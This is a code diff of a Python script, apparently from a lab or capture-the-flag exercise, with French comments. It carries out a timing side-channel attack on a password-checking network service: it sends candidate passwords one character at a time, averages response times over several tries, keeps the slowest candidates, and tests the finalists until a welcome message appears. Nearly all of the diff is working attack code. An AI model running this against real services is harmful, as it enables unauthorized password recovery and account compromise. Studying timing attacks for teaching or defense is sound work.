@@ -1,6 +1,7 @@
 import string
 import sys, socket, csv, time
 from functools import partial
+from tqdm import tqdm
 
 from simple_term_menu import TerminalMenu
 from colorama import init, Fore, Style
@@ -62,69 +63,61 @@ def find_pin_without_optimisation(ma_socket: socket.socket, password_length: int
     print('Recherche du mot de passe...')
     caracteres_ascii = string.printable
     incorrect_message = repr(b'Bad password\n')
-    partial_password = []
+    partial_password = ["aaaaaaaa"]
+    value = 5
+    expected_message = repr(b'Welcome :)\n')
 
     for position in range(password_length):
-        timers = []
-        if position == 0:
-            for caracter in caracteres_ascii:
-                caracters[position] = caracter
-                tentative = ''.join(caracters)
-                timer_start = time.time()
-                ma_socket.sendall(bytes(tentative, 'utf-8'))
-                ma_socket.recv(1024)
-                timer_end = time.time()
-                timers.append((tentative, timer_end - timer_start))
-
-            if position == 0:
-                top_positions = sorted(timers, key=lambda x: x[1], reverse=True)[:10]
-                for i in range(len(top_positions)):
-                    partial_password.append(top_positions[i][0])
-
-        else:
-            temporary_times = []
-            for password in partial_password:
-                password_list = list(password)
-                timers = []
-                for caracter in caracteres_ascii:
+        temporary_times = []
+        for password in partial_password:
+            password_list = list(password)
+            timers = []
+            for caracter in tqdm(caracteres_ascii):
+                total_time = 0
+                tentative = ''
+                for _ in range(value):
                     password_list[position] = caracter
                     tentative = ''.join(password_list)
                     timer_start = time.time()
                     ma_socket.sendall(bytes(tentative, 'utf-8'))
                     ma_socket.recv(1024)
                     timer_end = time.time()
-                    timers.append((tentative, timer_end - timer_start))
+                    total_time += (timer_end - timer_start)
 
-                max_position = sorted(timers, key=lambda x: x[1], reverse=True)[:10]
-                temporary_times.append(max_position)
+                avg_time = total_time / value
+                timers.append((tentative, avg_time))
 
-            # print(len(temporary_times))
-            # print(temporary_times)
-            merged_data = [item for sublist in temporary_times for item in sublist]
+            max_position = sorted(timers, key=lambda x: x[1], reverse=True)[:value]
+            temporary_times.append(max_position)
 
-            positions = sorted(merged_data, key=lambda x: x[1], reverse=True)[:10]
-            partial_password = []
-            for i in range(len(positions)):
-                partial_password.append(positions[i][0])
+        merged_data = [item for sublist in temporary_times for item in sublist]
 
-            print(partial_password)
+        positions = sorted(merged_data, key=lambda x: x[1], reverse=True)[:value]
+        partial_password = []
+        for i in range(len(positions)):
+            partial_password.append(positions[i][0])
 
+        print(partial_password)
 
-    caracters = ''.join(caracters)
-    print("La proposition que nous testons est : ", caracters)
+    # Ici nous testons les 10 mots de passes trouvé
+    for possible_password in partial_password:
+        print("La proposition que nous testons est : ", possible_password)
 
-    ma_socket.sendall(bytes(str(caracters), 'utf-8'))
-    ligne = str(ma_socket.recv(1024))
-    print(ligne)
-    if not ligne == incorrect_message and len(ligne) == password_length:
-        password_use = caracters
-        password_found = True
+        ma_socket.sendall(bytes(possible_password, 'utf-8'))
+        ligne = str(ma_socket.recv(1024))
+        print(ligne)
+        if ligne == expected_message:
+            password_use = possible_password
+            password_found = True
 
-    if password_found:
-        print(Fore.GREEN, "Password found")
-        print("Le mot de passe utilisé est : ", password_use)
-        return
-    else:
+        if password_found:
+            print(Fore.GREEN, "Password found")
+            print("Le mot de passe utilisé est : ", password_use)
+            print(Style.RESET_ALL)
+            return
+
+    if not password_found:
+        # Ici par défaut on relance car le booléen permettant de savoir si on a trouvé le mot de passe n'est pas juste
         print(Fore.RED, "Suite non concluante !")
         print(Fore.RED, "On va appliquer à nouveau l'algorithme !")
         print(Style.RESET_ALL)
